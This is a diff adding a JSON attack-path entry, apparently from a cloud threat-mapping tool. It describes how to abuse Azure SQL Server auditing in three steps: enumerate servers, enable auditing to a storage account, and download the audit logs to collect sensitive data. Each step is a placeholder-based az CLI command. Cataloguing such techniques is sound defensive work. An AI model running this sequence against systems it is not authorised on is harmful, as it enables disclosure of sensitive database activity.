@@ -1,0 +1,48 @@
+{
+    "title": "Exploit SQL Server Auditing to Gather Sensitive Information",
+    "icon": "https://img.icons8.com/?size=100&id=47244&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "List SQL Servers",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/server.png",
+            "details": {
+                "command": "az sql server list --resource-group <ResourceGroupName>",
+                "description": "Lists all SQL servers in the specified resource group.",
+                "services": ["SQLServer"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.microsoft.com/en-us/cli/azure/sql/server?view=azure-cli-latest#az-sql-server-list"
+            }
+        },
+        {
+            "id": 3,
+            "label": "Configure Auditing",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/audit.png",
+            "details": {
+                "command": "az sql server audit-policy update --resource-group <ResourceGroupName> --server <ServerName> --state Enabled --storage-account <StorageAccountName>",
+                "description": "Configures auditing on the specified SQL server to log all activities.",
+                "services": ["SQLServer"],
+                "attack_types": ["Information Disclosure"],
+                "references": "https://docs.microsoft.com/en-us/cli/azure/sql/server/audit-policy?view=azure-cli-latest#az-sql-server-audit-policy-update"
+            }
+        },
+        {
+            "id": 4,
+            "label": "Access Audit Logs",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/log.png",
+            "details": {
+                "command": "az storage blob download --account-name <StorageAccountName> --container-name <AuditContainerName> --name <LogFileName> --file <LocalFileName>",
+                "description": "Downloads the audit logs to gather sensitive information.",
+                "services": ["SQLServer"],
+                "attack_types": ["Information Disclosure"],
+                "references": "https://docs.microsoft.com/en-us/cli/azure/storage/blob?view=azure-cli-latest#az-storage-blob-download"
+            }
+        }
+    ]
+}
